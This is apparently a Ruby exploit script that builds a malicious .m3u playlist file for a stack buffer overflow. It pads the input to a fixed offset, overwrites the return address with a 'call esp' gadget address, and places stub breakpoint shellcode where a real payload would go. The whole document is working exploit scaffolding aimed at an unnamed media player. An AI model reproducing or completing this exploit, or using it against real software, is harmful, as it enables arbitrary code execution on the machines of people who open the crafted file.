#!/usr/bin/env ruby

#7C914663

shellcode = "\xcc"
eip = "\x63\x46\x91\x7C" # Memory address 7C914663 call esp

jmp = "\xcc"

payload = "http://" + shellcode + "A" * (2031 - shellcode.size) + eip + jmp + "C" * (24 - jmp.size)

puts " [+] Writing exploit file exploit"
File.open("exec.m3u", 'w') {|f| f.write(payload)}

puts " [+] File written"
puts " [+] #{payload.size} bytes"